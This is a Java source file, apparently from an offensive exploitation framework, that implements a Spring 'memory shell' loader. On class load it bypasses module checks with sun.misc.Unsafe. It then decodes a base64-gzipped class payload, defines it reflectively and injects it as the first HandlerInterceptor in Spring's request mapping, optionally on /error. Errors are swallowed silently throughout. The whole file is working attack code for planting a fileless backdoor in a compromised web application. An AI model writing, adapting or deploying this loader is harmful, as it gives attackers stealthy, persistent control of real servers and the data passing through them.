package com.ppp.middleware.loader;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.JavaClassType;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;
import sun.misc.Unsafe;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 */
@Middleware(Middleware.Spring)
@MemShell(MemShell.Interceptor)
@JavaClassType(JavaClassType.Default)
@JavaClassModifiable({JavaClassModifiable.CLASSNAME, JavaClassModifiable.PATH})
public class SpringInterceptorContextLoader {
    private static String gzipObject;
    private static String CLASSNAME;
    private static String PATH;

    static {
        new SpringInterceptorContextLoader();
    }

    public SpringInterceptorContextLoader() {
        try {
            inject();
        } catch (Exception e) {

        }
    }

    public static void inject() throws Exception {
        addModule();
        Object requestAttributes = Class.forName("org.springframework.web.context.request.RequestContextHolder").getMethod("currentRequestAttributes").invoke(null);
        Object context = invokeMethod(Class.forName("org.springframework.web.context.request.RequestAttributes"), requestAttributes, "getAttribute", new Class[]{String.class, Integer.TYPE}, new Object[]{"org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0});
        Object abstractHandlerMapping = invokeMethod(Class.forName("org.springframework.context.support.AbstractApplicationContext"), context, "getBean", new Class[]{String.class}, new Object[]{"requestMappingHandlerMapping"});
        ArrayList adaptedInterceptors = (ArrayList) getFieldValue(abstractHandlerMapping, "adaptedInterceptors");

        for (Object object : adaptedInterceptors) {
            if (object instanceof Proxy) {
                if (getFieldValue(object, "h").getClass().getName().equals(CLASSNAME)) {
                    return;
                }
            }
        }

        Class handlerInterceptorClass = Class.forName("org.springframework.web.servlet.HandlerInterceptor");
        byte[] bytes = decompress(gzipObject);

        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Class clazz;
        try {
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        } catch (Exception e) {
            clazz = classLoader.loadClass(CLASSNAME);
        }

        Object javaObject = clazz.newInstance();
        Object object = Proxy.newProxyInstance(handlerInterceptorClass.getClassLoader(), new Class[]{handlerInterceptorClass}, (InvocationHandler) javaObject);
        // 插入到第一个
        // 载入调试 org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandlerExecutionChain
        // 特定 path 比如 error
        if (PATH != null) {
            Class cls = Class.forName("org.springframework.web.servlet.handler.MappedInterceptor");
            Object mappedInterceptor = cls.getConstructor(new Class[]{String[].class, String[].class, handlerInterceptorClass}).newInstance(new Object[]{new String[]{"/error"}, null, object});
            adaptedInterceptors.add(0, mappedInterceptor);
        } else {
            adaptedInterceptors.add(0, object);
        }
    }

    public static byte[] decompress(String gzipObject) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(base64(gzipObject));
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static byte[] base64(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) invokeMethod(clazz.getSuperclass(), clazz.newInstance(), "decodeBuffer", new Class[]{String.class}, new Object[]{str});
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = invokeMethod(clazz, null, "getDecoder", new Class[]{}, new Object[]{});
            return (byte[]) invokeMethod(decoder.getClass(), decoder, "decode", new Class[]{String.class}, new Object[]{str});
        }
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static void addModule() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);
            Method method = Class.class.getDeclaredMethod("getModule");
            method.setAccessible(true);
            Object module = method.invoke(Object.class);
            Class cls = SpringInterceptorContextLoader.class;
            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectMethod.setAccessible(true);
            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
        } catch (Throwable e) {

        }
    }
}
